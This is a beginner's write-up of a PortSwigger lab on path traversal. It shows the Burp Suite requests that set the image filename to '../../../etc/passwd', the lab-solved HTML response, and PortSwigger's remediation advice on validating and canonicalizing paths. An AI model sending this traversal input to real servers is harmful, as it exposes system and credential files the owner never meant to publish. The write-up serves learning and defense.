# Server Side Vulnerabilities - Path Traversal

Date: 11/08/2025

URL: https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/path-traversal-apprentice/file-path-traversal/what-is-path-traversal

Lab URL: https://0ad40060044768f580581c7d003a00db.web-security-academy.net/

Environment: Portswigger Web Security Academy - Path Traversal Lab, Burp Suite Community Edition (proxy & browser)

## Summary

As part of my introduction to cyber security and pentesting, I'll be learning Burp Suite. I've installed the 
Community Edition and am going through the web security academy.

The first vulnerability I learned about was path traversal, where you can read (or even write!)arbitrary server files that the developer or admin did not intend to be public. This is done by requesting a URL on an insecure web server that points to an unintended path. For example, instead of 

```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

## Objectives

The lab presents a shopping website with the objective of retrieving the contents of /etc/passwd. 

## Methods, Steps, & Results

I first began intercepting HTTP traffic with Burp's proxy. I grabbed the first GET request for an image:

```
GET /image?filename=72.jpg HTTP/2
Host: 0ad40060044768f580581c7d003a00db.web-security-academy.net
Cookie: <redacted>
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0ad40060044768f580581c7d003a00db.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

Before forwarding the request to the server, I modified the filename:

```
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0ad40060044768f580581c7d003a00db.web-security-academy.net
Cookie: <redacted>
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0ad40060044768f580581c7d003a00db.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

We can see doing so sends a WebSocket response to the client containing some HTML that modifies the lab banner on the site to show the lab is solved and a congratulatory pop-up.

```
  <section class='academyLabBanner is-solved'>
        <div class=container>
            <div class=logo></div>
                <div class=title-container>
                    <h2>File path traversal, simple case</h2>
                    <a class=link-back href='https://portswigger.net/web-security/file-path-traversal/lab-simple'>
                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                        <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                            <g>
                                <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                            </g>
                        </svg>
                    </a>
                </div>
                <div class='widgetcontainer-lab-status is-solved'>
                    <span>LAB</span>
                    <p>Solved</p>
                    <span class=lab-status-icon></span>
                </div>
            </div>
        </div>
    </section>
    <section id=notification-labsolved class=notification-labsolved-hidden>
        <div class=container>
            <h4>Congratulations, you solved the lab!</h4>
            <div>
                <span>
                    Share your skills!
                </span>
                <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aFile+path+traversal%2c+simple+case%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2ffile-path-traversal%2flab-simple&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                </a>
                <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2ffile-path-traversal%2flab-simple'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                </a>
                <a href='https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/path-traversal-apprentice/file-path-traversal/lab-simple'>
                    Continue learning 
                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                        <g>
                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                        </g>
                    </svg>
                </a>
            </div>
        </div>
    </section>

    <script src='/resources/labheader/js/completedLabHeader.js'></script>
```

<img width="942" height="716" alt="path-traversal-complete" src="https://github.com/user-attachments/assets/3736ec61-c018-4317-b07d-604ea7c8dd0c" />

Hooray! First lab completed. 

Of course we don't get the actual contents of a passwd file in the lab. However, had this been a real target, the severity could have been high depending on the sensitivity of the arbitrary file contents provided. 

## Remediation

According to [Portswigger](https://portswigger.net/web-security/file-path-traversal), to defend against path traversal attacks, there are two methods available. The first one being to avoid passing user-supplied input to filesystem APIs altogether. 

In the event this isn't possible, there are two layers of defense that can be used to prevent these attacks:

* Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
* After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.

Portswigger goes on to provide some code examples. While I'm not familiar enough with JavaScript to implement this yet, knowing of these attack's existence will be useful in my journey, and I will eventually learn enough programming to defend against them!
